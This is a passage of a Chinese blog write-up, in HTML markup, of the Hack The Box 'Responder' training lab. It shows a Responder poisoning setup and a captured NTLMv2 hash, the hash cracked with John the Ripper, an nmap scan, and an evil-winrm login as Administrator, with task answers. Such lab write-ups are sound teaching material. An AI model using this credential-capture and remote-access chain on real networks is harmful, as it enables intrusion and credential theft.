+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Upstream Proxy             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Poisoning Options:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Analyze Mode               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force WPAD auth            &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force Basic Auth           &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force LM downgrade         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Force ESS downgrade        &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Generic Options:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder NIC              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;tun0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder IP               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.16.102&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder IPv6             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;fe80::9173:8b5e:3706:68d9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Challenge &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;random&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t Respond To Names     [&amp;#39;&lt;/span&gt;ISATAP&lt;span class=&#34;s1&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt;ISATAP.LOCAL&lt;span class=&#34;s1&#34;&gt;&amp;#39;]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    Don&amp;#39;&lt;/span&gt;t Respond To MDNS TLD  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_DOSVC&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    TTL &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; poisoned response  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;default&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Current Session Variables:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder Machine Name     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WIN-7IMMIPY7GC2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder Domain Name      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;FBJI.LOCAL&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Responder DCE-RPC Port     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;49779&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Version: Responder 3.2.2.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Author: Laurent Gaffie, &amp;lt;lgaffie@secorizon.com&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Listening &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; events...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后让靶机访问我们的攻击机：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101234241202.png&#34;
+	width=&#34;1830&#34;
+	height=&#34;237&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101234241202_hu13226376595720514353.png 480w, https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101234241202_hu9809322530650335125.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261101234241202&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;772&#34;
+		data-flex-basis=&#34;1853px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;下面就是我们抓取到的哈希：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Client   : 10.129.90.34
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Username : RESPONDER&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Hash     : Administrator::RESPONDER:1a9b74e7cb5cea88:529BBCE014913781D92863C829E822B7:01010000000000000098BA4EED69DD01CED011A1149549530000000002000800460042004A00490001001E00570049004E002D00370049004D004D00490050005900370047004300320004003400570049004E002D00370049004D004D0049005000590037004700430032002E00460042004A0049002E004C004F00430041004C0003001400460042004A0049002E004C004F00430041004C0005001400460042004A0049002E004C004F00430041004C00070008000098BA4EED69DD010600040002000000080030003000000000000000010000000020000099CA4CCA78D467625073E7CCB60FA6B36B27FEED1DA573D43B2A468D7382B97B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100300032000000000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;答案：-I&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-8&#34;&gt;Task 8
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as &lt;code&gt;john&lt;/code&gt;, but the full name is what?.&lt;/p&gt;
+&lt;p&gt;有一些工具会接收 NetNTLMv2 质询/响应，并尝试数百万个密码，以查看是否有任何密码会生成相同的响应。其中一款工具通常被称为 John，但它的全名是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;答案：John the Ripper&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-9&#34;&gt;Task 9
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;What is the password for the administrator user?&lt;/p&gt;
+&lt;p&gt;管理员用户的密码是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# vim hash.txt                                     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# cat hash.txt                                     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Administrator::RESPONDER:1a9b74e7cb5cea88:529BBCE014913781D92863C829E822B7:01010000000000000098BA4EED69DD01CED011A1149549530000000002000800460042004A00490001001E00570049004E002D00370049004D004D00490050005900370047004300320004003400570049004E002D00370049004D004D0049005000590037004700430032002E00460042004A0049002E004C004F00430041004C0003001400460042004A0049002E004C004F00430041004C0005001400460042004A0049002E004C004F00430041004C00070008000098BA4EED69DD010600040002000000080030003000000000000000010000000020000099CA4CCA78D467625073E7CCB60FA6B36B27FEED1DA573D43B2A468D7382B97B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100300032000000000000000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# john -w&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Using default input encoding: UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;netntlmv2, NTLMv2 C/R &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD4 HMAC-MD5 32/64&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;badminton        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Administrator&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1g 0:00:00:00 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2026-11-01 10:44&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 25.00g/s 102400p/s 102400c/s 102400C/s slimshady..oooooo
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show --format=netntlmv2&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Session completed. 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;答案：badminton&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-10&#34;&gt;Task 10
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;We&amp;rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?&lt;/p&gt;
+&lt;p&gt;我们将使用 Windows 服务（即在目标主机上运行的服务）通过我们找回的密码远程访问响应服务器。它监听的是哪个 TCP 端口？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# nmap -Pn 10.129.90.34                            
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.99 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2026-11-01 10:45 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.90.34 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.90.34&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.27s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; filtered tcp ports &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;no-response&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp   open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5985/tcp open  wsman
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 21.59 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;5985 = WinRM（WS-Management，wsman）。HTTP 明文 WinRM。&lt;/p&gt;
+&lt;p&gt;WinRM 是微软实现的 &lt;strong&gt;WS-Management 协议&lt;/strong&gt;，用来做 Windows 远程管理，最核心用途：&lt;strong&gt;PowerShell 远程（PSRemoting）&lt;/strong&gt;，远程在目标机器上执行 powershell 命令、拿 shell、读取系统信息。 支持 NTLM、Kerberos 认证，默认只允许管理员账号登录。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：5985&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-11&#34;&gt;Task 11
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;On which user&amp;rsquo;s desktop is the flag located?&lt;/p&gt;
+&lt;p&gt;flag 位于哪个用户的桌面上？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# evil-winrm -i 10.129.90.34 -u Administrator -p badminton
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Evil-WinRM shell v3.9
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;quoting_detection_proc&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; module Reline
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                        
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Info: Establishing connection to remote endpoint
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;responder&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;dministrator
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
